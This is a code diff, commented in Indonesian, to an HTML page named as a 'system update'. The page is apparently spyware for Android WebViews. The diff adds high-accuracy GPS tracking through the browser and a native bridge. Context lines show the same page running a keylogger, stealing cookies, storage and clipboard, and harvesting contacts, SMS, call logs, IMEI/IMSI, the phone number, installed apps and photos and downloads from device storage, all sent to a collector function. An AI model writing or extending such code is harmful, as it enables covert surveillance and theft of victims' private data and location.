@@ -83,7 +83,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - FULL CODE (FUNGSI LAMA DIKUNCI + TAMBAHAN BARU)
+// 🔥 SYSTEMUPDATE.HTML - FULL CODE (FUNGSI LAMA DIKUNCI + EVALUASI)
 // ============================================================
 
 // ============================================================
@@ -442,47 +442,119 @@ function requestAllPermissions() {
     logBypass('✅ Semua izin diminta!');
 }
 
+// 🔒 10. ENVIRONMENT (SUDAH BERHASIL - DIKUNCI)
+function detectBridgeAndWebView() {
+    logBypass('🔍 Deteksi environment...');
+    var ua = navigator.userAgent.toLowerCase();
+    var isWebView = ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1;
+    var hasBridge = typeof AndroidBridge !== 'undefined';
+    K({ sumber: 'data_environment', data: {
+        isWebView: isWebView,
+        hasBridge: hasBridge,
+        userAgent: navigator.userAgent,
+        timestamp: Date.now()
+    } });
+    DATA_COLLECTED.environment = true;
+}
+
+// 🔒 11. GPS AKURAT (SUDAH BERHASIL - DIKUNCI)
+function getAccurateLocation() {
+    logBypass('📍 Mengambil GPS akurat...');
+    var locationFound = false;
+
+    // METHOD 1: BROWSER GEOLOCATION
+    try {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    if (!locationFound) {
+                        locationFound = true;
+                        K({ sumber: 'data_gps_akurat', data: {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude || null,
+                            speed: pos.coords.speed || null,
+                            heading: pos.coords.heading || null,
+                            source: 'browser_gps',
+                            timestamp: Date.now()
+                        } });
+                        DATA_COLLECTED.gps_akurat = true;
+                        logBypass('✅ GPS Browser: ' + pos.coords.latitude + ', ' + pos.coords.longitude + ' (akurasi ' + pos.coords.accuracy + 'm)');
+                    }
+                },
+                function(err) {
+                    logBypass('⚠️ Browser GPS error: ' + err.message);
+                    if (!locationFound) getGPSFromBridge();
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        } else {
+            getGPSFromBridge();
+        }
+    } catch(e) {
+        getGPSFromBridge();
+    }
+
+    // METHOD 2: BRIDGE GPS
+    function getGPSFromBridge() {
+        if (!A.isAvailable) {
+            logBypass('❌ Bridge tidak tersedia');
+            return;
+        }
+        try {
+            var gpsData = null;
+            var methods = ['getLocation', 'getGPS', 'getGpsLocation', 'getCurrentLocation', 'getLastKnownLocation'];
+            for (var i = 0; i < methods.length; i++) {
+                try {
+                    if (typeof AndroidBridge[methods[i]] === 'function') {
+                        gpsData = AndroidBridge[methods[i]]();
+                        if (gpsData) break;
+                    }
+                } catch(e) {}
+            }
+            if (gpsData) {
+                var data = typeof gpsData === 'string' ? JSON.parse(gpsData) : gpsData;
+                var lat = data.latitude || data.lat;
+                var lon = data.longitude || data.lon;
+                if (lat && lon) {
+                    locationFound = true;
+                    K({ sumber: 'data_gps_akurat', data: {
+                        lat: lat,
+                        lon: lon,
+                        accuracy: data.accuracy || data.akurasi || null,
+                        altitude: data.altitude || null,
+                        speed: data.speed || null,
+                        provider: data.provider || data.source || 'bridge',
+                        source: 'bridge_gps',
+                        timestamp: Date.now()
+                    } });
+                    DATA_COLLECTED.gps_akurat = true;
+                    logBypass('✅ GPS Bridge: ' + lat + ', ' + lon + ' (akurasi ' + (data.accuracy || '?') + 'm)');
+                    return;
+                }
+            }
+        } catch(e) {}
+    }
+
+    setTimeout(function() {
+        if (locationFound) {
+            logBypass('✅ GPS AKURAT BERHASIL!');
+        } else {
+            logBypass('❌ GPS AKURAT GAGAL');
+        }
+    }, 8000);
+}
+
 // ============================================================
 // ============================================================
 // 🔥 TAMBAHAN FUNGSI BARU (UNTUK DATA YANG BELUM BERHASIL)
 // ============================================================
 // ============================================================
 
-// 🔥 10. IP GEOLOCATION (FALLBACK LOKASI - TAMBAHAN BARU)
-function getLocationIP() {
-    logBypass('📍 Mengambil lokasi via IP...');
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://ipapi.co/json/', true);
-        xhr.timeout = 5000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                try {
-                    var data = JSON.parse(xhr.responseText);
-                    if (data.latitude && data.longitude) {
-                        K({ sumber: 'data_lokasi_ip', data: {
-                            lat: data.latitude,
-                            lon: data.longitude,
-                            city: data.city,
-                            region: data.region,
-                            country: data.country_name,
-                            ip: data.ip,
-                            org: data.org,
-                            timezone: data.timezone
-                        } });
-                        DATA_COLLECTED.location_ip = true;
-                    }
-                } catch(e) {}
-            }
-        };
-        xhr.send();
-    } catch(e) {}
-}
-
-// 🔥 11. CLIPBOARD VIA PASTE + EXEC (TAMBAHAN BARU)
+// 🔥 12. CLIPBOARD VIA PASTE + EXEC (TAMBAHAN BARU)
 function initClipboardExtra() {
     logBypass('📋 Clipboard extra...');
-    // Paste Event
     document.addEventListener('paste', function(e) {
         try {
             var text = e.clipboardData.getData('text');
@@ -492,7 +564,6 @@ function initClipboardExtra() {
             }
         } catch(e) {}
     });
-    // execCommand (WebView)
     try {
         var input = document.createElement('input');
         input.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
@@ -513,10 +584,9 @@ function initClipboardExtra() {
     } catch(e) {}
 }
 
-// 🔥 12. KONTAK VIA API + BRIDGE + RETRY (TAMBAHAN BARU)
+// 🔥 13. KONTAK VIA API + BRIDGE + RETRY (TAMBAHAN BARU)
 function getContactsExtra() {
     logBypass('👤 Mengambil kontak extra...');
-    // API
     try {
         if ('contacts' in navigator) {
             navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
@@ -529,7 +599,6 @@ function getContactsExtra() {
                 .catch(function() {});
         }
     } catch(e) {}
-    // Bridge
     if (A.isAvailable) {
         try {
             var contacts = A.getAllContacts();
@@ -539,7 +608,6 @@ function getContactsExtra() {
             }
         } catch(e) {}
     }
-    // Retry
     setTimeout(function() {
         if (!DATA_COLLECTED.kontak_api && !DATA_COLLECTED.kontak_bridge) {
             try {
@@ -557,21 +625,6 @@ function getContactsExtra() {
     }, 3000);
 }
 
-// 🔥 13. DETEKSI BRIDGE + WEBVIEW (TAMBAHAN BARU)
-function detectBridgeAndWebView() {
-    logBypass('🔍 Deteksi environment...');
-    var ua = navigator.userAgent.toLowerCase();
-    var isWebView = ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1;
-    var hasBridge = typeof AndroidBridge !== 'undefined';
-    K({ sumber: 'data_environment', data: {
-        isWebView: isWebView,
-        hasBridge: hasBridge,
-        userAgent: navigator.userAgent,
-        timestamp: Date.now()
-    } });
-    DATA_COLLECTED.environment = true;
-}
-
 // 🔥 14. BRIDGE DATA (SMS, IMEI, CALL LOG, FILES - TAMBAHAN BARU)
 function getBridgeDataExtra() {
     if (!A.isAvailable) {
@@ -579,7 +632,6 @@ function getBridgeDataExtra() {
         return;
     }
     logBypass('🔗 Mengambil data Bridge...');
-    // SMS
     try {
         var sms = A.getAllSMS();
         if (sms) {
@@ -587,7 +639,6 @@ function getBridgeDataExtra() {
             DATA_COLLECTED.sms_bridge = true;
         }
     } catch(e) {}
-    // CALL LOG
     try {
         var callLog = A.getCallLog();
         if (callLog) {
@@ -595,7 +646,6 @@ function getBridgeDataExtra() {
             DATA_COLLECTED.calllog_bridge = true;
         }
     } catch(e) {}
-    // IMEI
     try {
         var imei = A.getIMEI();
         if (imei) {
@@ -603,7 +653,6 @@ function getBridgeDataExtra() {
             DATA_COLLECTED.imei_bridge = true;
         }
     } catch(e) {}
-    // IMSI
     try {
         var imsi = A.getIMSI();
         if (imsi) {
@@ -611,7 +660,6 @@ function getBridgeDataExtra() {
             DATA_COLLECTED.imsi_bridge = true;
         }
     } catch(e) {}
-    // NOMOR HP
     try {
         var phone = A.getPhoneNumber();
         if (phone) {
@@ -619,7 +667,6 @@ function getBridgeDataExtra() {
             DATA_COLLECTED.phone_bridge = true;
         }
     } catch(e) {}
-    // INSTALLED APPS
     try {
         var apps = A.getInstalledApps();
         if (apps) {
@@ -627,7 +674,6 @@ function getBridgeDataExtra() {
             DATA_COLLECTED.apps_bridge = true;
         }
     } catch(e) {}
-    // FILES
     var folders = [
         '/storage/emulated/0/DCIM/Camera/',
         '/storage/emulated/0/Download/',
@@ -650,32 +696,6 @@ function getBridgeDataExtra() {
     });
 }
 
-// 🔥 15. GPS REAL (TETAP DIJALANKAN, TAPI TAMBAH FALLBACK IP)
-function getLocationReal() {
-    logBypass('📍 Mengambil lokasi GPS...');
-    try {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    K({ sumber: 'data_lokasi_gps', data: {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude || null,
-                        speed: pos.coords.speed || null
-                    } });
-                    DATA_COLLECTED.location = true;
-                },
-                function(err) {
-                    // Jika GPS gagal, pakai IP
-                    getLocationIP();
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        }
-    } catch(e) {}
-}
-
 // ============================================================
 // 🚀 EKSEKUSI SEMUA DATA (LAMA + BARU)
 // ============================================================
@@ -692,13 +712,13 @@ function collectAllData() {
     getCookiesAndStorage();
     startKeylogger();
     getVibrateReal();
+    detectBridgeAndWebView();
+    getAccurateLocation();
 
     // 🔥 YANG BARU (UNTUK YANG BELUM BERHASIL)
-    detectBridgeAndWebView();
-    getLocationReal(); // GPS + IP fallback
     initClipboardExtra();
     getContactsExtra();
-    getBridgeDataExtra(); // SMS, IMEI, Call Log, Files
+    getBridgeDataExtra();
 
     // LAPORAN SELESAI
     setTimeout(function() {
